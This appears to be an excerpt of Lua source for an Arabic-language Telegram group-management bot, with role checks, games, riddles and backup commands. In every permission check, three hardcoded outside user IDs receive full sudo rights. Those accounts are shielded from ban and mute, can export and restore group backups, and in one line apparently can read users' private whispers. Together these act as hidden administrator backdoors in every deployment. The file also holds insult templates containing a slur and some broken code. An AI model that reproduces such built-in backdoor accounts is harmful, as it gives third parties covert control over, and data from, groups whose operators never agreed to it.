...
-- All The File By Developer Faeder : @AY_AHD
...
bot_id = botid,
username = username, 
sudo_users = {SUDO,944353237,0101010100,1010192901},
...
--     By Developer Faeder     -- 
-------- Bot Owner
function is_leader(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) or tonumber(msg.sender_user_id_) == tonumber(0101010100) or tonumber(msg.sender_user_id_) == tonumber(1010192901) then var = true end return var end
function is_leaderid(user_id) local var = false if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(0101010100) or user_id == tonumber(944353237) or user_id == tonumber(1010192901) then var = true end return var end
-------- Sudo
function is_sudo(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) or tonumber(msg.sender_user_id_) == tonumber(0101010100) or tonumber(msg.sender_user_id_) == tonumber(1010192901) then var = true end return var end
function is_sudoid(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
-------- Sudo3
function is_admin(user_id) local var = false local hashsb =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashsb, user_id) if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
-------- Owner all
function is_onall(user_id) local var = false local hash =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) if onall then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
--------Modod all
function is_moall(user_id) local var = false local hash =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashss, user_id) if moall then var = true end if admin then var = true end if onall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
-------- Vip Member All
function is_vpall(user_id) local var = false local hashs =  'bot:vpall:' local vpall = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:moall:'local moall = faederdx1:sismember(FAEDER..hashssss, user_id) if vpall then var = true end if onall then var = true end if admin then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
-------- Donky
function is_donky(user_id, chat_id) local var = false local hash =  'bot:donky:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hashfaed, user_id) if donky then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
-------- Monsh
function is_monsh(user_id, chat_id) local var = false local hash =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) if monsh then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
-------- Monsh2
function is_monsh2(user_id, chat_id) local var = false local hash =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashss, user_id) if monsh2 then var = true end if admin then var = true end if monsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
-------- Owner
function is_owner(user_id, chat_id) local var = false local hash =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if owner then var = true end if admin then var = true end if monsh then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
-------- Modod
function is_momod(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashssss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
-------- Vip Member
function is_vipmem(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hashfaed, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if vipmem then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
----------------------------------------------------------
--     By Developer Faeder     -- 
...
send(msg.chat_id_, msg.id_,"❀ لا يمكن الوصول الي معلومات العضو ،")
end end,nil) end
--     By Developer Faeder     -- 
...
faeder  = "مبرمج السورس"
elseif tonumber(msg.sender_user_id_) == tonumber(0101010100) then
faeder  = "ملك التلجرام 👑"
elseif tonumber(msg.sender_user_id_) == tonumber(1010192901) then
...
faeder  = "مبرمج السورس"
elseif tonumber(user_id) == tonumber(0101010100) then
faeder  = "ملك التلجرام 👑"
elseif tonumber(user_id) == tonumber(1010192901) then
faeder  = "الباشمبرمج التلجرام 👑"
...
faederdx(msg.chat_id_, msg.id_, 1, '❀ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'..' )\n❀ *تم رفعه ( '..faederrt..' )\n❀ *بواسطه ( '..renk_faeder(msg)..' )*\n*', 1, 'md')
...
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '❀ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'SOPOWERB0T')..')'..' )\n❀ تم رفعه ( '..text1[2]..' )\n❀ بواسطه ( '..renk_faeder(msg)..' )\n', 1, 'md')
...
{'ضع دعم','الجروبات','تعيين قناه الاشتراك'},
...
local inline = {{{text="المطور",url="t.me/"..(SudoFaeder or "SOPOWERB0T")}}}
local Sudo_Welcome = '❀ يمكنك ايضا استخدام الاوامر الخدميه \n❀ اليك ازرار الاوامر الخدميه اسفل الرساله\n                  •┉ • ┉ • ┉ Ͳλℜλ ┉ • ┉ • ┉•\n                              [TARA](https://t.me/SOPOWERB0T)'
local key = {
{'زخرفه','احسب عمرك'},
{'الابراج','نسبه الحب'},
{'قسم الحمايه'},
...
if text == 'الغاء' then   
faederdx(msg.chat_id_, msg.id_, 1, '❀ تم الغاء حفظ كليشه الستارت .', 1, 'md')
faederdx1:del(FAEDER..'Start:Bots') 
return false
end
faederdx1:set(FAEDER.."Start:Bot",text)  
faederdx(msg.chat_id_, msg.id_, 1, '❀ تم حفظ كليشه الستارت .', 1, 'md')
faederdx1:del(FAEDER..'Start:Bots') 
return false
end
--     By Developer Faeder     -- 
...
local text = text:gsub('user',(result.username_ or 'SOPOWERB0T'))
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
...
local text = text:gsub('user',(msg.content_.members_[0].username_ or 'SOPOWERB0T'))
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     By Developer Faeder     -- 
-------- Contact
...
local text = text:gsub('username',(result.username_ or 'SOPOWERB0T'))
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
...
--     By Developer Faeder     -- 
if text:match("شيعي نكس") or text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("طائفيه") or text:match("انا سني") or text:match("انا شيعي") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("بالشيعه") or text:match("شيعه") then
...
if text == 'جلب نسخه الجروبات' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) or text == 'جلب نسخه الجروبات' and  tonumber(msg.sender_user_id_) == tonumber(0101010100) or text == 'جلب نسخه الجروبات' and  tonumber(msg.sender_user_id_) == tonumber(944353237) then
...
--     By Developer Faeder     -- 
if text == 'رفع النسخه' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) or text == 'رفع النسخه' and tonumber(msg.sender_user_id_) == tonumber(0101010100) or text == 'رفع النسخه' and tonumber(msg.sender_user_id_) == tonumber(944353237) then   
...
--     By Developer Faeder     -- 
if text and text:match("مين ضفني") or text:match("مين ضافني") then
...
faederdx( msg.chat_id_, msg.id_, 1,"*❀ يوجد فقط { 6 } اختيارات ارسل اختيارك مره اخري .*\n", 1, "md")
return false  end 
...
faederdx(msg.chat_id_,msg.id_, 1, "*❀ هذا المعرف ليس تابع لقناه *\n", 1 , "md")
return false
end end 
...
faederdx(msg.chat_id_,msg.id_, 1, "❀ تم حفظ القناه ، \n❀ قم بتفعيل الاشتراك الاجباري الان ، \n", 1 , "html")
return false
end
--     By Developer Faeder     -- 
...
if text == 'مبرمج السورس' or text == 'سورس ديف أحمد' or text == 'سورس أحمد'  then if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then faeder =  "[مـبـرمـج سـورس تـارا](t.me/AY_AHD)" else faeder = '' end faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end 
...
faeder2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفي','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = faeder2[math.random(#faeder2)]
...
name = string.gsub(name,'مستشفي','ي ش س ف ت م') name = string.gsub(name,'كهرباء','ر ب ك ه ا ء') name = string.gsub(name,'تفاحه','ح ه ا ت ف') name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
...
local faeder = {  "آخر مره زرت مدينه الملاهي؟",  "آخر مره أكلت أكلتك المفضّله؟","الوضع الحالي؟\n‏1. سهران\n‏2. ضايج\n‏3. أتأمل","آخر شيء ضاع منك؟","كلمه أخيره لشاغل البال؟","طريقتك المعتاده في التخلّص من الطاقه السلبيه؟","شهر من أشهر العام له ذكري جميله معك؟","كلمه غريبه من لهجتك ومعناها؟🤓","‏- شيء سمعته عالق في ذهنك هاليومين؟","متي تكره الشخص الذي أمامك حتي لو كنت مِن أشد معجبينه؟","‏- أبرز صفه حسنه في صديقك المقرب؟","هل تشعر أن هنالك مَن يُحبك؟","اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟","أجمل شيء حصل معك خلال هاليوم؟","صِف شعورك وأنت تُحب شخص يُحب غيرك؟👀💔","كلمه لشخص غالي اشتقت إليه؟💕","آخر خبر سعيد، متي وصلك؟","أنا آسف علي ....؟","أوصف نفسك بكلمه؟","‏- صريح، هل سبق وخذلت أحدهم ولو عن غير قصد؟","‏- ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الي الآن؟💭","‏- فنان/ه تود لو يدعوكَ علي مائده عشاء؟😁❤","‏- تخيّل شيء قد يحدث في المستقبل؟","‏- للشباب | آخر مره وصلك غزل من فتاه؟🌚","شخص أو صاحب عوضك ونساك مُر الحياه ما اسمه ؟","| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمه الحديث شو راح تكون ؟.","اخر افلام شاهدتها","ما هي وظفتك الحياه","اعز اصدقائك ?","اخر اغنيه سمعتها ?","تكلم عن نفسك","ليه انت مش سالك","مين نت","اخر كتاب قرآته","روايتك المفضله ?","اخر اكله اكلتها","اخر كتاب قرآته","ليه أحمد جدع","افضل يوم ف حياتك","ليه مضيفتش كل جهاتك","حكمتك ف الحياه","لون عيونك","كتابك المفضل","هوايتك المفضله","علاقتك مع اهلك"," ما السيء في هذه الحياه ؟ ","أجمل شيء حصل معك خلال هذا الاسبوع ؟ ","سؤال ينرفزك ؟ "," هل يعجبك سورس تارا ؟؟ "," اكثر ممثل تحبه ؟ ","قد تخيلت شي في بالك وصار ؟ ","شيء عندك اهم من الناس ؟ ","تفضّل النقاش الطويل او تحب الاختصار ؟ ","وش أخر شي ضيعته؟ ","اي رايك في سورس تارا ؟ ","كم مره حبيت؟ "," اكثر المتابعين عندك باي برنامج؟"," نسبه النعاس عندك حاليًا؟"," نسبه الندم عندك للي وثقت فيهم ؟","تحب ترتبط بكيرفي ولا فلات؟"," جربت شعور احد يحبك بس انت مو قادر تحبه؟"," تجامل الناس ولا اللي بقلبك علي لسانك؟"," عمرك ضحيت باشياء لاجل شخص م يسوي ؟","مغني تلاحظ أن صوته يعجب الجميع إلا أنت؟ "," آخر غلطات عمرك؟ "," مسلسل كرتوني له ذكريات جميله عندك؟ "," ما أكثر تطبيق تقضي وقتك عليه؟ "," أول شيء يخطر في بالك إذا سمعت كلمه نجوم ؟ "," قدوتك من الأجيال السابقه؟ "," أكثر طبع تهتم بأن يتواجد في شريك/ه حياتك؟ ","أكثر حيوان تخاف منه؟ "," ما هي طريقتك في الحصول علي الراحه النفسيه؟ "," إيموجي يعبّر عن مزاجك الحالي؟ "," أكثر تغيير ترغب أن تغيّره في نفسك؟ ","أكثر شيء أسعدك اليوم؟ ","اي رايك في جوست وعدم سلكانه؟ ","ما هو أفضل حافز للشخص؟ ","ما الذي يشغل بالك في الفتره الحاليه؟","آخر شيء ندمت عليه؟ ","شاركنا صوره احترافيه من تصويرك؟ ","تتابع انمي؟ إذا نعم ما أفضل انمي شاهدته ","يرد عليك متأخر علي رساله مهمه وبكل برود، موقفك؟ ","نصيحه تبدا ب -لا- ؟ ","كتاب أو روايه تقرأها هذه الأيام؟ ","فيلم عالق في ذهنك لا تنساه مِن روعته؟ ","يوم لا يمكنك نسيانه؟ ","شعورك الحالي في جمله؟ ","كلمه لشخص بعيد؟ ","صفه يطلقها عليك الشخص المفضّل؟ ","أغنيه عالقه في ذهنك هاليومين؟ ","أكله مستحيل أن تأكلها؟ ","كيف قضيت نهارك؟ ","تصرُّف ماتتحمله؟ ","موقف غير حياتك؟ ","اكثر مشروب تحبه؟ ","القصيده اللي تأثر فيك؟ ","متي يصبح الصديق غريب ","وين نلقي السعاده برايك؟ ","تاريخ ميلادك؟ ","قهوه و لا شاي؟ ","من محبّين الليل أو الصبح؟ ","حيوانك المفضل؟ ","كلمه غريبه ومعناها؟ ","كم تحتاج من وقت لتثق بشخص؟ ","اشياء نفسك تجربها؟ ","يومك ضاع علي؟ ","كل شيء يهون الا ؟ ","اسم ماتحبه ؟ ","وقفه إحترام للي إخترع ؟ ","أقدم شيء محتفظ فيه من صغرك؟ ","كلمات ماتستغني عنها بسوالفك؟ ","وش الحب بنظرك؟ ","حب التملك في شخصِيـتك ولا ؟ ","تخطط للمستقبل ولا ؟ ","موقف محرج ماتنساه ؟ ","من طلاسم لهجتكم ؟ ","اعترف باي حاجه ؟ ","عبّر عن مودك بصوره ؟ ","اسم دايم ع بالك ؟ ","اشياء تفتخر انك م سويتها ؟ "," لو بكيفي كان ؟ ",}  
...
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الي سفينه نوح عليه السلام ؟') name = string.gsub(name,'المطر','شيئ يسقط علي رأسك من الاعلي ولا يجرحك فما هو ؟')
...
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكه ؟') name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس ميه تنوره .من هيه ؟ ') name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
...
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟') name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه علي بعضهما في اليوم الواحد ')
...
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟') name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه علي لونه ؟')
name = string.gsub(name,'المرايه','اري كل شيئ من دون عيون من اكون ؟ ') name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
...
name = string.gsub(name,'النخله','الطول طول ___ والعقل عقل الصخله')
name = string.gsub(name,'سلايه','بالوجه امرايه وبالظهر ___ ')
name = string.gsub(name,'الخيل','من قله ___ شدو علي الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني ___ ')
name = string.gsub(name,'المبلل',' ___ ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغه الحيه يخاف من جره ___ ')
name = string.gsub(name,'يركص','المايعرف ___ يقول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح ___ يقول حامض')
name = string.gsub(name,'العمه','___ إذا حبت الچنه ابليس يدخل الجنه')
name = string.gsub(name,'الخبز','انطي ___ للخباز حتي لو ياكل نصه')
name = string.gsub(name,'بالحصاد','اسمه ___ ومنجله مكسور')
name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من علي الحاضر لكه')
...
faederdx1:incrby(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
faederdx(msg.chat_id_, msg.id_, 1,'*❀ التخمين الصحيح هو* ~ '..NUM..'\n*❀ مبروك لقد ربحت وحصلت علي 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
...
faederdx(msg.chat_id_, msg.id_, 1,'❀ لقد خمنت الرقم الخطا وتبقي لديك '..SetNum..' ارسل رقم تخمنه مره اخري للفوز', 1, 'md')
end
end
end
end
...
--     By Developer Faeder     -- 
if text == "تعيين قناه الاشتراك" or text == "تغيير قناه الاشتراك" and faeder11(msg) then
...
faederdx(msg.chat_id_,msg.id_, 1, "*❀ ارسل لي معرف قناه الاشتراك *\n", 1 , "md")
end end
--     By Developer Faeder     -- 
...
faederdx(msg.chat_id_,msg.id_, 1, "*❀ لم يتم تعيين القناه ، \n❀ ارسل تعيين قناه الاشتراك . *", 1 , "md")
return false 
end
...
--     By Developer Faeder     -- 
if text == 'جلب قناه الاشتراك' or text == 'قناه الاشتراك' then
if not is_leader(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '❀  للمطور الاساسي فقط ', 1, 'md')
else
local faeder5 = faederdx1:get(FAEDER.."faeder3")
if faeder5 then
faederdx(msg.chat_id_, msg.id_, 1, '❀ *قناه الاشتراك* : ['..faeder5..']', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '❀ لم يتم تعيين القناه ', 1, 'md')
end end end
--     By Developer Faeder     --
...
faederdx(msg.chat_id_, msg.id_, 1, '❀ يمكنك من خلال هذا البوت\n❀ ارسال همسه سريه للاعضاء \n❀ الامر كالاتي مثال : اهمس هلو [@AY_AHD]', 1, 'md')
end
if text and text:match("/start hms(.*)_(%d+)") then 
faed_dx = {string.match(text, "^/start hms(.*)_(%d+)")}
if tonumber(msg.sender_user_id_) == tonumber(944353237[2]) or tonumber(msg.sender_user_id_) == tonumber(faed_dx[2])  then 
Faeder = faederdx1:get(FAEDER.."HM:"..faed_dx[1]..faed_dx[2])
if Faeder then 
faederdx(msg.chat_id_, msg.id_, 1, '❀ الهمسه هي\n❀ { ['..Faeder..'] }', 1, 'md')
else 
faederdx(msg.chat_id_, msg.id_, 1, '❀ السلك يسطا الهمسه مش ليك 😂 ،', 1, 'md')
end else 
faederdx(msg.chat_id_, msg.id_, 1, '❀ االسلك يسطا الهمسه مش ليك 😂 ،', 1, 'md')
end end
--     By Developer Faeder     -- 
if text then  
local function promote_admin(extra, result, success)  
...
faederdx(msg.chat_id_, msg.id_, 1, '', 1, 'md')
end
getChannelMembers(msg.chat_id_,0, 'Administrators', 100, promote_admin)
end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text == "فحص" or text == "فحص البوت" or text == "صلاحيات البوت" and faeder11(msg) then
...
faederdx(msg.chat_id_, msg.id_, 1, '❀ هذا معرف قناه وليس معرف حساب', 1, 'md') 
return false  
end
...
elseif tonumber(result.sender_user_id_) == tonumber(0101010100) then
faeder  = "ملك التلجرام 👑"
elseif tonumber(result.sender_user_id_) == tonumber(1010192901) then
faeder  = "الباشمبرمج التلجرام 👑"
...
--     By Developer Faeder     -- 
if text:match("^تاك (.*)$")  and faeder11(msg) then
...
{{text = 'Hexonix', url="https://t.me/gamee?game=Hexonix"},{text = 'game 2048', url="https://t.me/awesomebot?game=g2048"}}, 
...
if text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$") or text:match("^(طقس) (.*)$") and faeder11(msg) then
  ...
  if jtab.name then
   ...
   .."   "..jtab.main.temp.."° كلفن\n"
   .."• الجو "..status.." تقريبا\n\n"
   .."• درجه حراره اليوم الصغري : C"..C2.."°   F"..F2.."°   K"..jtab.main.temp_min.."°\n"
   .."• درجه حراره اليوم الكبري : C"..C3.."°   F"..F3.."°   K"..jtab.main.temp_max.."°\n"
   .."• رطوبه الهواء : "..jtab.main.humidity.."%\n"
...
if tonumber(result.id_) == tonumber(0101010100)  then 
faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك ملك التلجرام ؟ 🌚🙆', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(1010192901)  then 
faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
return false  
end  
...
local faeder = {  "لكك جرجف @"..username.." احترم تاجراسك لا اكتلك واخري علي كبرك،💩","هيو جرجف @"..username.." لتضل تمسلت حيوان دوختنه،😐👊","حبيبي @"..username.." راح احاول احترمك هالمره بلكي تبطل حيونه، 🤔🔪","هيو الحضينه @"..username.."شبيك تكمز حيوان 🤕👊","باع هذا المنغولي @"..username.."شبيك حبي مغير علاجك ؟ صير عاقل لا اخذك للسده 🤒🤙",}
faederdx(msg.chat_id_, result.id_, 1,''..faeder[math.random(#faeder)]..'', 1, 'html') 
local faeder = "صار ستاذي 💞🏃" 
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md') 
else  
faederdx(msg.chat_id_, msg.id_, 1, '❀ العضو غير موجود في المجموعه', 1, 'md') 
end end 
...
if tonumber(result.sender_user_id_) == tonumber(0101010100) then  
faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك ملك التلجرام ؟ 🌚🙆', 1, 'md') 
return false
end 
if tonumber(result.sender_user_id_) == tonumber(1010192901) then  
faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
return false
end 
...
local faeder = {"لك جرجف احترم تاجراسك لا اكتلك واخري علي كبرك،💩","هيو جرجف لتضل تمسلت حيوان دوختنه،😐👊","جعب البريك راح احاول احترمك هالمره بلكي تبطل حيونه، 🤔🔪","هيو الحضينه شبيك تكمز حيوان 🤕👊","باع هذا المنغولي شبيك حبي مغير علاجك ؟ صير عاقل لا اخذك للسده 🤒🤙"} 
...
if tonumber(result.sender_user_id_) == tonumber(bot_owner) or tonumber(result.sender_user_id_) == tonumber(0101010100) or tonumber(result.sender_user_id_) == tonumber(944353237) then  
faederdx(msg.chat_id_, msg.id_, 1, 'مواححح احلي بوسهه المطوري😻🔥💗 @'..SudoFaeder, 1, 'html')
return false
end 
...
--     By Developer Faeder     -- 
if text:match("^رفع مشرف$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_
if user_info_ then
...
if text:match("^تنزيل مشرف$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_
if user_info_ then
...
if text:match("^رفع مشرف كامل$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_
if user_info_ then
...
if is_leaderid(result.sender_user_id_) == true then
faederdx(msg.chat_id_, msg.id_, 1, "❀ *لا تستطيع حظره ،*", 1, 'md')
return false 
end
...
if is_leaderid(result.sender_user_id_) == true then
faederdx(msg.chat_id_, msg.id_, 1, "❀ *لا تستطيع كتمه ،*", 1, 'md')
return false 
end
...
sendPhoto(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.jpg','❀ تم تحويل الملصق الي صوره')     
...
sendVoice(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.ogg',"❀ تم تحويل الـMp3 الي بصمه")
...
local faeder = '❀ اهلا عزيزي  '..renk_faeder(msg)..' \n❀ تم تغيير كليشه الايدي ،\n❀ ارسل الامر مره اخري للتغيير مجددا ،'
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
--     By Developer Faeder     -- 
if is_leader(msg) then
if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشه الايدي$") and faeder11(msg) or text and text:match("^تعيين ايدي عام$") and faeder11(msg) or text and text:match("^تعيين الايدي عام$") and faeder11(msg) then   
...
if text == 'الغاء' then   
faederdx(msg.chat_id_, msg.id_, 1, '❀ تم الغاء حفظ كليشه الايدي ،', 1, 'md')
faederdx1:del("FAEDER:New:id:"..bot_id..msg.sender_user_id_)
return false
end
faederdx1:del("FAEDER:New:id:"..bot_id..msg.sender_user_id_)
faederdx(msg.chat_id_, msg.id_, 1, '❀ تم حفظ كليشه الايدي العامه ،', 1, 'md')
faederdx1:set("FAEDER:faeder:id:text:"..bot_id,text)
return false
end
if text and text:match("^حذف الايدي العام$") or text and text:match("^مسح الايدي العام$") or text and text:match("^حذف كليشه الايدي$") then
